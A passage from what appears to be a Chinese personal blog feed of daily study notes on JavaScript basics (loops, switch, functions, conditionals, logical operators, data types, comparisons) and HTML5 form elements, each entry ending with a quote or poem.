(begin; condition; step) &#123;  循环体&#125;begin进入循环时执行一次condition判断条件body条件为真时，重复运行step每次循环体迭代后执行</code></pre><p>内联变量声明:<br>&emsp;&emsp;函数在执行时，会先在自己的函数体里查询变量，如果没有，才会一级一级往上查找。函数show()在执行时，输出第一个变量a是undefined是因为它现在自己的执行环境里查询到变量a已声明，即变量提升（即变量可以提前声明但是赋值是不可以的），此时就输出了undefined。<br>&emsp;&emsp;因此会出现变量污染现象<br>省略语句段:<br>&emsp;&emsp;不需要做任何事的部分，就可以省略 begin 语句段<br>&emsp;&emsp;注意for的两个;必须存在</p><h5 id="break与continue"><a href="#break与continue" class="headerlink" title="break与continue"></a>break与continue</h5><p>一，普通<br>用法与python一样<br>但是，禁止break/continue在‘?’的右边<br>所以，不建议使用?代替if语句<br>二，进阶</p><pre><code>标签(在循环之前带有冒号的标识符)break &lt;labelName&gt; 语句跳出循环至标签labelName:处continue &lt;labelName&gt; 语句执行跳转到标记循环的下一次迭代可以将标签移至单独一行break 指令必须在代码块内continue 只有在循环内部才可行</code></pre><h5 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h5><pre><code>至少一个 case 代码块和一个可选的 default 代码块switch(x) &#123;  case &#39;value1&#39;:  // if (x === &#39;value1&#39;)    ...    [break]  case &#39;value2&#39;:  // if (x === &#39;value2&#39;)    ...    [break]  default:    ...    [break]&#125;流程:判断条件从成立的开始往下执行直到break，若无break则走到尾(包括default)分组:case 3: // (*) 下面这两个 case 被分在一组，满足一个条件就执行，原理是没有breakcase 5:  alert(&#39;Wrong!&#39;);  alert(&quot;Why don&#39;t you take a math class?&quot;);  break;</code></pre><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>在 JavaScript 中，函数不是“神奇的语言结构”，而是一种特殊的值<br>创建函数的三种方法:函数声明，函数表达式，箭头函数</p><pre><code>function name(parameter1, parameter2, ... parameterN) &#123;  ...body...&#125;name();首先是关键字，然后是函数名，然后是括号之间的参数列表(用逗号分隔)，最后是花括号之间的代码(函数体)parameter是函数参数，下面引用函数时可以使用它作为参数(argument)未提供parameter时，那么相应的值就会变成undefined(默认参数)可以text = &quot;内容&quot;这样子来传参返回值return执行时，函数停止，并将值返回给调用代码，没有返回值会导致函数立即退出并为undefined</code></pre><p>局部变量:<br>在函数中声明的变量只在该函数内部可见</p><p>外部变量:<br>函数也可以访问外部变量<br>函数对外部变量拥有全部的访问权限。函数也可以修改外部变量。<br>函数内部声明了同名变量，那么函数会遮蔽外部变量</p><pre><code>默认参数的计算:在JS中，函数在没带个别参数的情况下被调用，默认参数会被计算出来。如果传递了参数text，那么anotherFunction()就不会被调用。如果没传递参数text，那么anotherFunction()就会被调用。function showMessage(from, text = anotherFunction()) &#123;  // anotherFunction() 仅在没有给定 text 时执行  // 其运行结果将成为 text 的值&#125;也可以这样function showCount(count) &#123;  // 如果 count 为 undefined 或 null，则提示 &quot;unknown&quot;  alert(count ?? &quot;unknown&quot;);&#125;showCount(0); // 0showCount(null); // unknownshowCount();                        // unknown或者这样function showMessage(text) &#123;  // ...  if (text === undefined) &#123;         // 如果参数未被传递进来    text = &#39;empty message&#39;;  &#125;  alert(text);&#125;showMessage();                      // empty message还可以这样function showMessage(text) &#123;  // 如果 text 为 undefined 或者为假值，那么将其赋值为 &#39;empty&#39;  text = text || &#39;empty&#39;;  alert(text);&#125;showMessage();                     // empty</code></pre><p>返回值</p><pre><code>function doNothing() &#123; /* 没有代码 */ &#125;alert( doNothing());函数无返回值，它就会像返回 undefined 一样空值的 return 和 return undefined 等效如果想要将返回的表达式写成跨多行的形式，那么应该在return的同一行开始写此表达式(比如先写个括号)</code></pre><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>作为参数传递给函数的值，会被复制到函数的局部变量。<br>函数可以访问外部变量。但它只能从内到外起作用。函数外部的代码看不到函数内的局部变量。<br>函数可以返回值。如果没有返回值，则其返回的结果是 undefined。<br>为了使代码简洁易懂，建议在函数中主要使用局部变量和参数，而不是外部变量<br>获取参数、使用参数并返回结果的函数更容易理解。<br>一个好的函数名能够让我们马上知道这个函数的功能是什么，会返回什么。<br>一个单独的函数不仅更容易测试和调试 —— 它的存在本身就是一个很好的注释！</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><p>一月添香<br>二月夜未央<br>三月情诗慌张<br>四月对镜补红妆<br>五月相携游马十方<br>六月日日笙歌抛流光<br>七月为卿斟唱曲水流觞<br>八月年华辗转处陌上成双<br>九月田中百花争艳怜意满腔<br>十月眠里光阴归去思念倾满江<br>十一月冬雷阵阵我笑悲歌不恸上苍<br>十二月天寒地冻凭楼伫等把痴梦熬荒<br>可叹，人间再无双</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript基础（2）</title>
      <link href="/2022/11/02/b-16/"/>
      <url>/2022/11/02/b-16/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="条件分支"><a href="#条件分支" class="headerlink" title="条件分支"></a>条件分支</h4><h5 id="一，if"><a href="#一，if" class="headerlink" title="一，if"></a>一，if</h5><p>括号里的条件表达式计算结果是 true，就会执行对应的代码块<br>如果有多个语句要执行，我们必须将要执行的代码块封装在大括号内</p><h5 id="二，布尔转换"><a href="#二，布尔转换" class="headerlink" title="二，布尔转换"></a>二，布尔转换</h5><p>if语句会计算圆括号内的表达式，并将计算结果转换为布尔型<br>数字0、空字符串””、null、undefined和NaN都会被转换成false。因为它们被称为“假值（falsy）”。<br>其他值被转换为 true，所以它们被称为“真值（truthy）”。</p><h5 id="三，else"><a href="#三，else" class="headerlink" title="三，else"></a>三，else</h5><p>if 语句判断条件不成立，就会执行它内部的代码</p><h5 id="四，多个条件"><a href="#四，多个条件" class="headerlink" title="四，多个条件"></a>四，多个条件</h5><pre><code>let year = prompt(&#39;提示语&#39;, &#39;&#39;);            #设置变量并赋值                                            #prompt相当于inputif (year &lt; 2015) &#123;                          #判断条件  alert( &#39;Too early...&#39; );                  #成立就执行alert，相当于print&#125; else if (year &gt; 2015) &#123;                   #另一个条件判断  alert( &#39;Too late&#39; );&#125; else &#123;                                    #若上面的条件都不满足  alert( &#39;Exactly!&#39; );&#125;                                           #大括号要把整个if语句的执行部分都包含起来</code></pre><h5 id="五，条件运算符"><a href="#五，条件运算符" class="headerlink" title="五，条件运算符?"></a>五，条件运算符?</h5><p>(有时被称为三元运算符,因为该运算符中有三个操作数,它是 JavaScript 中唯一一个有这么多操作数的运算符)<br>根据一个条件去赋值一个变量</p><pre><code>let result = condition ? value1 : value2;计算条件结果，如果结果为真，则返回 value1，否则返回 value2。condition(条件判断)尽量用括号包起来注意空格</code></pre><h5 id="六，多个"><a href="#六，多个" class="headerlink" title="六，多个?"></a>六，多个?</h5><pre><code>let age = prompt(&#39;age?&#39;, 18);let message = (age &lt; 3) ? &#39;Hi, baby!&#39; :  (age &lt; 18) ? &#39;Hello!&#39; :  (age &lt; 100) ? &#39;Greetings!&#39; :  &#39;What an unusual age!&#39;;alert( message );相当于if (age &lt; 3) &#123;  message = &#39;Hi, baby!&#39;;&#125; else if (age &lt; 18) &#123;  message = &#39;Hello!&#39;;&#125; else if (age &lt; 100) &#123;  message = &#39;Greetings!&#39;;&#125; else &#123;  message = &#39;What an unusual age!&#39;;&#125;</code></pre><h5 id="七，-的非常规使用"><a href="#七，-的非常规使用" class="headerlink" title="七，?的非常规使用"></a>七，?的非常规使用</h5><pre><code>有时可以使用问号 ? 来代替 if 语句：let company = prompt(&#39;Which company created JavaScript?&#39;, &#39;&#39;);(company == &#39;Netscape&#39;) ?   alert(&#39;Right!&#39;) : alert(&#39;Wrong.&#39;);注意缩进</code></pre><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><h5 id="（或）"><a href="#（或）" class="headerlink" title="||（或）"></a>||（或）</h5><p>任意一个参数为 true，返回的结果就为 true，否则返回 false<br>如果操作数不是布尔值，那么它将会被转化为布尔值来参与运算<br>例如 1 被作为 true 处理， 0 则被作为 false</p><h5 id="amp-amp-（与）"><a href="#amp-amp-（与）" class="headerlink" title="&amp;&amp;（与）"></a>&amp;&amp;（与）</h5><p>两个操作数都是真值时，与运算返回 true，否则返回 false<br>函数 alert 返回了 undefined,所以会运算并输出alert然后停止</p><h5 id="（非）"><a href="#（非）" class="headerlink" title="!（非）"></a>!（非）</h5><p>将操作数转化为布尔类型：true/false<br>返回相反的值<br>!! 有时候用来将某个值转化为布尔类型<br>(第一个非运算将该值转化为布尔类型并取反，第二个非运算再次取反。就得到了布尔值的转化)</p><h5 id="（空值合并运算符）"><a href="#（空值合并运算符）" class="headerlink" title="??（空值合并运算符）"></a>??（空值合并运算符）</h5><p>a ?? b 的结果是：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一个参数不是 null/undefined，则返回第一个参数，否则返回第二个参数</p><h5 id="拓展用法"><a href="#拓展用法" class="headerlink" title="拓展用法:"></a>拓展用法:</h5><p>||寻找第一个真值,&amp;&amp;寻找第一个假值</p><p>原理:一个或运算 || 的链，将返回第一个真值，如果不存在真值，就返回该链的最后一个值<br>运用:(a)获取变量列表或者表达式中的第一个真值<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(b)短路求值<br>注意:  &amp;&amp; 的优先级比或 || 要高<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不要用 || 或 &amp;&amp; 来取代 if<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;非运算符 ! 的优先级在所有逻辑运算符里面最高<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;?? 运算符的优先级与 || 相同<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;??返回第一个已定义的值</p><h4 id="请加上括号！！！"><a href="#请加上括号！！！" class="headerlink" title="请加上括号！！！"></a>请加上括号！！！</h4><h3 id="训练-登录校验"><a href="#训练-登录校验" class="headerlink" title="训练(登录校验)"></a>训练(登录校验)</h3><pre><code>let firstName = null;let lastName = null;let nickName = &quot;Supercoder&quot;;// 显示第一个已定义的值：alert(firstName ?? lastName ?? nickName ?? &quot;匿名&quot;);let userName = prompt(&quot;Who&#39;s there?&quot;, &#39;&#39;);if (userName === &#39;Admin&#39;) &#123;  let pass = prompt(&#39;Password?&#39;, &#39;&#39;);  if (pass === &#39;TheMaster&#39;) &#123;    alert( &#39;Welcome!&#39; );  &#125; else if (pass === &#39;&#39; || pass === null) &#123;    alert( &#39;Canceled&#39; );  &#125; else &#123;    alert( &#39;Wrong password&#39; );  &#125;&#125; else if (userName === &#39;&#39; || userName === null) &#123;  alert( &#39;Canceled&#39; );&#125; else &#123;  alert( &quot;I don&#39;t know you&quot; );&#125;</code></pre><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="人的一生中总会有某个时刻，需要坚守自己的决定。一个说“这就是我，这就是我的选择”的时刻。"><a href="#人的一生中总会有某个时刻，需要坚守自己的决定。一个说“这就是我，这就是我的选择”的时刻。" class="headerlink" title="人的一生中总会有某个时刻，需要坚守自己的决定。一个说“这就是我，这就是我的选择”的时刻。"></a>人的一生中总会有某个时刻，需要坚守自己的决定。一个说“这就是我，这就是我的选择”的时刻。</h5>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript基础（1）</title>
      <link href="/2022/11/01/b-15/"/>
      <url>/2022/11/01/b-15/</url>
      
        <content type="html"><![CDATA[<h4 id="从今天开始学习JavaScript啦！"><a href="#从今天开始学习JavaScript啦！" class="headerlink" title="从今天开始学习JavaScript啦！"></a>从今天开始学习JavaScript啦！</h4><h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><p>1.概念<br>&nbsp; &nbsp; 这种编程语言写出来的程序被称为脚本。它们可以被直接写在网页的 HTML 中，在页面加载的时候自动执行。<br>&nbsp; &nbsp; 脚本被以纯文本的形式提供和执行。它们不需要特殊的准备或编译即可运行。<br>2.JavaScript 引擎<br>&nbsp; &nbsp;首先，引擎（如果是浏览器，则引擎被嵌入在其中）读取（“解析”）脚本。<br>&nbsp; &nbsp;然后，引擎将脚本转化（“编译”）为机器语言。<br>&nbsp; &nbsp;然后，机器代码快速地执行。<br>3.作用<br>&nbsp; &nbsp;JavaScript 可以做与网页操作、用户交互和 Web 服务器相关的所有事情。<br>4.局限性<br>&nbsp; &nbsp;(1)网页中的 JavaScript 没有直接访问操作系统的功能。<br>&nbsp; &nbsp;(2)不同的标签页/窗口之间通常互不通信(“同源策略”)为了解决“同源策略”问题，两个标签页必须&lt;都&gt;包含一些处理这个问题的特定的 JavaScript 代码，并均允许数据交换。<br>&nbsp; &nbsp;(3)可以轻松地通过互联网与当前页面所在的服务器进行通信</p><h4 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h4><pre><code>1.markup(标签)   type 特性：&lt;script type=…&gt;                                           #已不需要   language 特性：&lt;script language=…&gt;                                   #已不需要2.外部脚本   将大量的 JavaScript 代码放入一个单独的文件。   脚本文件可以通过 src 特性（attribute）添加到 HTML 文件中。   使用独立文件的好处是浏览器会下载它，然后将它保存到浏览器的 缓存 中。   之后，其他页面想要相同的脚本就会从缓存中获取，而不是下载它。所以文件实际上只会下载一次。   这可以节省流量，并使得页面（加载）更快。   &lt;script src=&quot;路径&quot;&gt;&lt;/script&gt;                                        #要附加多个脚本，请使用多个标签   注意:如果设置了 src 特性，script 标签内容将会被忽略。3.语句   在代码中编写任意数量的语句。语句之间可以使用;进行分割。                #可以放在一行或多行   当存在换行符时，在大多数情况下可以省略分号(自动分号插入)4.注释   单行注释以两个正斜杠字符 // 开始。                                    #Ctrl+/快捷键   /* 多行注释*/5.现代模式(&quot;use strict&quot;)   &quot;use strict&quot; 出现在脚本的最顶部,保证旧的功能能够使用</code></pre><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><pre><code>1.概念   let message;                                                        #创建（声明或者定义）一个名称为“message”的变量   message = &#39;Hello&#39;;                                                  #为变量添加一些数据2.变量命名限制   首字符必须非数字   变量名称必须仅包含字母、数字、符号 $ 和 _   可以将变量定义和赋值合并成一行,也可以在一行中声明多个变量   对于确定不变的变量尽量使用大写3.常数变量   声明一个常数（不变）变量，可以使用const而非let</code></pre><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><pre><code>1.Number 类型   包括整数，浮点数和特殊数值(Infinity、-Infinity 和 NaN)   NaN代表计算错误。它是不正确或者未定义的数学操作所得到的结果,任何对NaN的进一步数学运算都会返回NaN,除了NaN**0=12.BigInt 类型   BigInt用于表示任意长度的整数。可以通过将n附加到整数字段的末尾来创建BigInt值。3.String 类型   字符串必须被括在引号里(单双引号无区别，反引号是功能扩展，允许我们通过将变量和表达式包装在$&#123;…&#125;中)   在反引号内$&#123;…&#125;的表达式会被计算4.Boolean 类型(逻辑类型)   仅包含两个值true和false   布尔值也可作为比较的结果5.null 值   null值不属于上述任何一种类型,它构成了一个独立的类型，只包含 null 值   null仅仅是一个代表“无”、“空”或“值未知”的特殊值6.undefined 值   特殊值undefined和null一样自成类型,undefined的含义是未被赋值   如果一个变量已被声明，但未被赋值，那么它的值就是 undefined   通常使用null将一个“空”或者“未知”的值写入变量，而undefined则保留作为未进行初始化的事物的默认初始值7.Object 类型   object 用于储存数据集合和更复杂的实体8.Symbol 类型   symbol 类型用于创建对象的唯一标识符9..typeof 运算符   typeof 运算符以字符串的形式返回数据类型注:typeof null的结果为&quot;object&quot;。这是官方承认的typeof的错误   typeof alert的结果是&quot;function&quot;,因为alert在JavaScript语言中是一个函数,   函数隶属于object类型。但是typeof会对函数区分对待，并返回&quot;function&quot;   typeof(x)与typeof x相同</code></pre><h4 id="交互"><a href="#交互" class="headerlink" title="交互"></a>交互</h4><pre><code>alert   alert(&quot;Hello&quot;);   显示模态窗(modal) ,直到他们处理完窗口prompt   result = prompt(title, [default]);   显示一个带有文本消息的模态窗口，还有input框和确定/取消按钮   title是显示给用户的文本，default是指定input框的初始值。 (中括号可去)   不提供default的话，浏览器会把undefined插入到prompt   prompt将返回用户在input框内输入的文本，如果用户取消了输入，则返回null   显示一个带有文本消息的模态窗口，还有input框和确定/取消按钮confirm   result = confirm(question);   显示一个带有question以及确定和取消两个按钮的模态窗口。   点击确定返回true,点击取消返回false。限制性:    模态窗口的确切位置由浏览器决定。通常在页面中心。    窗口的确切外观也取决于浏览器。我们不能修改它。</code></pre><h4 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h4><p>字符串转换&nbsp;&nbsp;x = String(x);<br>数字型转换&nbsp;&nbsp;Number(x)x<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;字符串变成NaN(存在字符)或0(除换行符\n制表符\t外为空)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;undefined变成NaN<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;null变成0<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;true 和 false变成1 and 0<br>布尔型转换&nbsp;&nbsp;Boolean(x)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;直观上为“空”的值（如 0、空字符串、null、undefined 和 NaN）将变为 false。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其他值变成 true。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;非空的字符串总是 true(PHP等语言视 “0” 为 false而js不是)</p><p>自动转换:<br>&nbsp;&nbsp;&nbsp;&nbsp;运算符和函数会自动将赋予它们的值转换为正确的类型<br>&nbsp;&nbsp;&nbsp;&nbsp;alert会自动将任何值都转换为字符串以进行显示;算术函数和表达式中会自动进行number类型转换</p><h4 id="基础运算符，数学运算"><a href="#基础运算符，数学运算" class="headerlink" title="基础运算符，数学运算"></a>基础运算符，数学运算</h4><h5 id="详见知识点"><a href="#详见知识点" class="headerlink" title="详见知识点"></a>详见<a href="https://zh.javascript.info/operators#yong-er-yuan-yun-suan-fu-lian-jie-zi-fu-chuan">知识点</a></h5><p>1.加号 + 用于求和<br>&nbsp;&nbsp;&nbsp;应用于字符串，连接各个字符串<br>&nbsp;&nbsp;&nbsp;只要任意一个运算元是字符串，那么另一个运算元也将被转化为字符串</p><p>2.数字转化，一元运算符 +<br>&nbsp;&nbsp;&nbsp;+ 应用于单个值，对数字没有任何作用。但是如果运算元不是数字，加号 + 则会将其转化为数字<br>&nbsp;&nbsp;&nbsp;效果和 Number(…) 相同，但是更加简短</p><p>3.<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Operator_Precedence">运算符优先级</a><br>&nbsp;&nbsp;&nbsp;一元运算符优先级高于二元运算符</p><p>4.其他运算方式<br>&nbsp;&nbsp;&nbsp;链式赋值 a = b = c = 2;<br>&nbsp;&nbsp;&nbsp;原地修改 n += 5;<br>&nbsp;&nbsp;&nbsp;自增/自减counter++;相当于counter = counter + 1;<br>&nbsp;&nbsp;&nbsp;自增/自减只能应用于变量，应用于数值（比如 5++）会报错<br>&nbsp;&nbsp;&nbsp;运算符 ++ 和 – 可以置于变量前，也可以置于变量后。<br>&nbsp;&nbsp;&nbsp;++和–放在前面使用的是自增后的值，放在后面是自增前的值<br>&nbsp;&nbsp;&nbsp;位运算符及<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Expressions_and_Operators#bitwise_operators">位操作符</a>:按位与 ( &amp; )按位或 ( | )按位异或 ( ^ )按位非 ( ~ )左移 ( &lt;&lt; )右移 ( &gt;&gt; )无符号右移 ( &gt;&gt;&gt; )<br>&nbsp;&nbsp;&nbsp;逗号运算符丢弃逗号前的结果，保留逗号后的</p><h4 id="值的比较"><a href="#值的比较" class="headerlink" title="值的比较"></a>值的比较</h4><p>一，比较结果为 Boolean 类型<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所有比较运算符均返回布尔值<br>二，字符串比较<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;按字符（母）逐个进行比较的<br>三，不同类型间的比较<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;先将其转化为数字再判定大小(true 会被转化为 1、false 转化为 0)<br>四，严格相等<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;严格相等运算符 === 在进行比较时不会做任何的类型转换(属于不同的数据类型就立刻返回 false)<br>五，比较 null 和 undefined<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;严格相等 === 比较二者时false<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;非严格相等 == 比较二者时true<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;数学式或其他比较方法 &lt; &gt; &lt;= &gt;= 时null 被转化为 0，undefined 被转化为 NaN<br>六，其它<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;null 会被转化为0<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;undefined 在比较中被转换为了 NaN，而 NaN 是一个特殊的数值型值，它与任何值进行比较都会返回 false<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;undefined 只与 null 相等</p><h4 id="总结问题"><a href="#总结问题" class="headerlink" title="总结问题"></a>总结问题</h4><pre><code>比较运算符始终返回布尔值。字符串的比较，会按照“词典”顺序逐字符地比较大小。当对不同类型的值进行比较时，它们会先被转化为数字（不包括严格相等检查）再进行比较。在非严格相等 == 下，null 和 undefined 相等且各自不等于任何其他的值。在使用 &gt; 或 &lt; 进行比较时，需要注意变量可能为 null/undefined 的情况。比较好的方法是单独检查变量是否等于 null/undefined。对于取值可能是 null/undefined 的变量，请按需要分别检查它的取值情况。除了严格相等 === 外，其他但凡是有 undefined/null 参与的比较，我们都需要格外小心。除非你非常清楚自己在做什么，否则永远不要使用 &gt;= &gt; &lt; &lt;= 去比较一个可能为 null/undefined 的变量。</code></pre><h2 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h2><h4 id="一愿识尽天下好人，二愿读尽世间好书，三愿看尽人间好山水。"><a href="#一愿识尽天下好人，二愿读尽世间好书，三愿看尽人间好山水。" class="headerlink" title="一愿识尽天下好人，二愿读尽世间好书，三愿看尽人间好山水。"></a>一愿识尽天下好人，二愿读尽世间好书，三愿看尽人间好山水。</h4>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML&amp;CSS拓展（6）</title>
      <link href="/2022/10/31/b-14/"/>
      <url>/2022/10/31/b-14/</url>
      
        <content type="html"><![CDATA[<h1 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h1><h3 id="复选框"><a href="#复选框" class="headerlink" title="复选框"></a>复选框</h3><pre><code>&lt;input type=&quot;radio&quot; name=&quot;1&quot; id=&quot;man&quot;&gt;&lt;label for=&quot;man&quot;&gt;男&lt;/label&gt;这里做一个补充:id是为了点击文字也可以选中，不然就只能点击那个圈来选了回归正轨1.type=&quot;checkbox&quot;可以多选2.type=&quot;checkbox&quot; checked=&quot;checked&quot;就能变成默认选中3.disabled=&quot;disabled&quot;或者disabled可以禁用该模块4.readonly是只读不能改</code></pre><h3 id="下拉菜单"><a href="#下拉菜单" class="headerlink" title="下拉菜单"></a>下拉菜单</h3><pre><code>&lt;body&gt;    &lt;select size=&quot;3&quot; multiple&gt;                              #size是一面可显示的选项  multiple是可多选        &lt;option value=&quot;a&quot;&gt;&lt;/option&gt;        &lt;option value=&quot;b&quot;&gt;&lt;/option&gt;                         #value是提供给后端使用的value值        &lt;option value=&quot;c&quot;&gt;&lt;/option&gt;        &lt;option value=&quot;d&quot; selected&gt;&lt;/option&gt;                #selected默认选中    &lt;/select&gt;&lt;/body&gt;</code></pre><h3 id="文本域-多行文本输入框"><a href="#文本域-多行文本输入框" class="headerlink" title="文本域(多行文本输入框)"></a>文本域(多行文本输入框)</h3><pre><code>&lt;div&gt;    &lt;textarea name=&quot;&quot; id=&quot;&quot; cols=&quot;30&quot; rows=&quot;10&quot; placeholder=&quot;&quot;&gt;内容&lt;/textarea&gt;&lt;/div&gt;cols是列   rows是行placeholder是预置文本，输入就会消失&lt;style&gt;    textarea&#123;        width:100px;        height:100px;        resize:vertical;    &#125;&lt;/style&gt;horizontal水平可调节both都可以none不能更改注意:placeholder的默认value是两个标识符之间的，换行也会跟着换行</code></pre><h3 id="字段集"><a href="#字段集" class="headerlink" title="字段集"></a>字段集</h3><pre><code>&lt;fieldset&gt;    &lt;legend&gt;内容1&lt;/legend&gt;    &lt;input type=&quot;radio&quot; name=&quot;aaa&quot;&gt;选项1    &lt;input type=&quot;radio&quot; name=&quot;aaa&quot;&gt;选项2    &lt;legend&gt;内容2&lt;/legend&gt;&lt;/fieldset&gt;</code></pre><h2 id="HTML5"><a href="#HTML5" class="headerlink" title="HTML5"></a>HTML5</h2><p>1.指定UTF-8<br>2.增加语义化标签(便于爬虫)<br>&nbsp;&nbsp; section,article,aside,header,footer,nav,figure,main<br>3.可以省略结束标签(最好不要)<br>4.在标签中可以使用单引号<br>5.音视频标签</p><pre><code>&lt;body&gt;    &lt;audio src=&quot;路径&quot; cintrols&gt;&lt;/audio&gt;    &lt;video src=&quot;路径&quot; poster=&quot;路径&quot;&gt;&lt;/video&gt;&lt;/body&gt;controls 可控制loop 循环autoplay 自动播放muted 静音播放poster 海报注意:设置宽高要适应视频画面大小</code></pre><h3 id="表单增强-以上传后端为例"><a href="#表单增强-以上传后端为例" class="headerlink" title="表单增强(以上传后端为例)"></a>表单增强(以上传后端为例)</h3><pre><code>一，颜色选择&lt;form action=&quot;action&quot;&gt;    &lt;input type=&quot;color&quot; name=&quot;aaa&quot; autofocus&gt;            #选择颜色，autofocus光标默认在这里    &lt;input type=&quot;email&quot; name=&quot;mymail&quot; required&gt;          #选择邮箱，required必填项    &lt;input type=&quot;url&quot; name=&quot;bbb&quot; multiple&gt;               #选择地址，multiple可选择多个地址，用逗号隔开    &lt;input type=&quot;tel&quot; name=&quot;ccc&quot;&gt;                        #tel只在手机端有用，显示输入页面    &lt;input type=&quot;range&quot; name=&quot;ddd&quot; min=&quot;100&quot; max=&quot;1000&quot; value=&quot;100&quot; step=&quot;10&quot;&gt;    #range滑块效果    &lt;input type=&quot;number&quot; name=&quot;eee&quot; min=&quot;0&quot; max=&quot;10&quot; value=&quot;4&quot; step=&quot;2&quot;&gt;          #选择数字，value是初始数据    &lt;input type=&quot;search&quot; name=&quot;fff&quot;&gt;                     #搜索框    &lt;input type=&quot;date&quot; name=&quot;ggg&quot;&gt;                       #选择日期，type改成month是精确到月份    &lt;input type=&quot;datetime-local&quot; name=&quot;hhh&quot;&gt;             #精确到秒&lt;/form&gt;注意！！！没有name就不能传到后端，提交了会在url上显示二，数据列表&lt;body&gt;    &lt;input type=&quot;text&quot; list=&quot;mylist&quot;&gt;              这里的list    &lt;datalist id=&quot;mylist&quot;&gt;                         和这里的id关联        &lt;option value=&quot;111111&quot;&gt;&lt;/option&gt;        &lt;option value=&quot;2433445&quot;&gt;&lt;/option&gt;        &lt;option value=&quot;333436653&quot;&gt;&lt;/option&gt;        上面输入就可以在下面显示有关的内容        &lt;option value=&quot;4、3、78&quot;&gt;&lt;/option&gt;    &lt;/datalist&gt;&lt;/body&gt;三，正则表达式在input中加入 pattern=&quot;[0-9][A-Z]&#123;3&#125;&quot;代表第一个要是0-9的，后面接着三个要是A-Z的</code></pre><h2 id="CSS3"><a href="#CSS3" class="headerlink" title="CSS3"></a>CSS3</h2><h4 id="选择器回顾-更新"><a href="#选择器回顾-更新" class="headerlink" 